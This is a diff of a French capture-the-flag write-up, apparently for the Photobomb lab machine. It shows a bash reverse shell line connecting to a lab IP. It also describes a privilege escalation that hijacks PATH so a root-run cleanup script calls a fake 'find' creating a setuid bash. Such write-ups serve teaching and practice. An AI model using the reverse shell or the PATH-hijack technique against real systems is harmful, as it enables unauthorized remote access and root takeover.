@@ -55,8 +55,49 @@ Dans un premier temps, un simple reverse shell "bash -i >& /dev/tcp/10.10.14.40/
 
 Puis, on passe notre payload dans la requète.
 
+![image](https://user-images.githubusercontent.com/33124690/195113874-e1f8dc08-c42c-4b56-9e19-d572dd4d2e68.png)
+
+Ainsi, on obtient un shell sur la machine pour récupérer le flag user.txt. On stabilise notre shell et on s'attaque au privesc !
 
 
+## Escalation de privilège
+
+On pourrait lancer Linpeas pour voir si il y a des chemins de privesc rapide, mais simplement à l'aide d'un ``` sudo -l``` on s'aperçoit que l'on peut lancer un script en temps que Root.
+![image](https://user-images.githubusercontent.com/33124690/195114580-44b45d8f-1db3-4d1c-8b1b-0d7160f848ca.png)
 
 
+```
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+Le script en question présente une vulnerabilité. En effet, "find" n'est pas défini avec son chemin absolu, on va pouvoir en abuser pour obtenir un shell root.
+
+On créé un fichier bash sous le nom de find sans /tmp. Ce dernier va copier bash et lui attribuer le setuid Root.
+
+![image](https://user-images.githubusercontent.com/33124690/195116301-aedbe85b-4dbb-4991-801b-fce196d24aa7.png)
+
+On oublie pas de chmod notre script find.
+
+Maintenant, il suffit de changer le path de notre utilisateur (an ajoutant "/tmp:") et de lancer le script :D
+
+![image](https://user-images.githubusercontent.com/33124690/195118038-967f6460-a179-44ed-999c-cefa2f902c17.png)
+
+Et voilà ! 
+
+![image](https://user-images.githubusercontent.com/33124690/195118182-d7881c4d-72f9-4887-87a3-895ca1ef5b4a.png)
+
+
+J'espère que ce premier WriteUp vous aura plus, j'en referai peut être à l'avenir.
 
